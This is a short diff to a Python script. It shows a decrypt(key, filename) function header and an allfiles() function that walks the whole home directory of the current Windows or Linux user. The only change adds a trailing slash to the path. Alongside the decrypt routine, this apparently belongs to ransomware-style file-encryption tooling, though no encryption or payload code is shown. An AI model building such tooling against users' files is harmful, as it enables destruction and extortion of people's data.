@@ -50,9 +50,9 @@ def decrypt(key, filename):
 	
 def allfiles():
         if (os.path.exists('C://Windows/System32/cmd.exe')==True):
-	    alldir = "C://Users/"+getpass.getuser()
+	    alldir = "C://Users/"+getpass.getuser()+"/"
         else:
-            alldir = "/home/"+getpass.getuser()
+            alldir = "/home/"+getpass.getuser()+"/"
 	allFiles = []
 	for root, subfiles, files in os.walk(alldir):
 		for names in files:
